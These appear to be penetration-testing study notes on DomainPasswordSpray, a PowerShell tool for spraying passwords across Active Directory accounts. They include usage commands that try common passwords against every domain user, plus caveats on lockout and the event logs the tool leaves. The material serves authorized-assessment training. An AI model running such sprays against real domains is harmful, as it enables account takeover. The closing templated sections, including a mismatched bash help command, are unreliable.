# DomainPasswordSpray

Windows-side password spraying script that pulls the user list directly from Active Directory (no need to supply one manually) and sprays a single password across all accounts while respecting the domain's lockout policy.

Cross-links: [[23. Attacking Active Directory Authentication|AD.5]], [[Active Directory Methodology#Step 2: Password Spraying|AD Methodology Phase 2 Step 2]]

---

## What problem it solves

Kerbrute and CrackMapExec spray from Kali. When you have a Windows foothold but no Kali connectivity (or the DC only accepts internal connections), DomainPasswordSpray runs the spray from inside the domain. It queries the domain controller directly for a fresh user list and applies the lockout threshold automatically.

## Install

```powershell
# Download: https://github.com/dafthack/DomainPasswordSpray
# No install — import and run
Import-Module .\DomainPasswordSpray.ps1
```

## Usage

```powershell
# Spray a single password across all domain accounts
Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
# Output: [*] SUCCESS! User:dbranch Password:Winter2022

# Spray with a custom user list (override the auto-pulled list)
Invoke-DomainPasswordSpray -UserList .\target_users.txt -Password Welcome1 -Outfile results.txt

# Spray with a list of passwords (one round per password, pauses between rounds)
Invoke-DomainPasswordSpray -Password "Welcome1,Welcome2023,Password1" -Outfile results.txt
```

## Caveats

- DomainPasswordSpray reads the lockout threshold from the domain policy and sprays at most `threshold - 1` attempts per account per round. But it does NOT enforce the observation window between rounds, you must manually wait the full observation window (e.g. 30 min) before a second pass.
- Still generates Windows Security Event Log entries (4625 for failed auth, 4624 for successful). Not stealthy.
- The auto-pulled user list includes disabled accounts by default. Consider filtering to only enabled accounts to reduce noise.
- Requires domain membership on the running host (or explicit DC connectivity).

#### Tags: #ModernTooling #DomainPasswordSpray #PasswordSpray #WindowsSpray #ActiveDirectory #HTBSupplementary
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

DomainPasswordSpray supports a repeatable task in an authorized assessment; knowing when to use it keeps the workflow deliberate rather than tool-led.

## Tool description

DomainPasswordSpray is a focused utility for the technique named by this page. Read its output as evidence and confirm important findings manually.

## Basic usage

Run the help screen first, then use the smallest command that answers the current question:

~~~bash
domainpasswordspray --help
~~~

## Related RUNBOOK V2 stage

- [[RUNBOOK V2/Index]] -- route to the technique-specific stage after identifying the finding

## Related module

- [[MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow
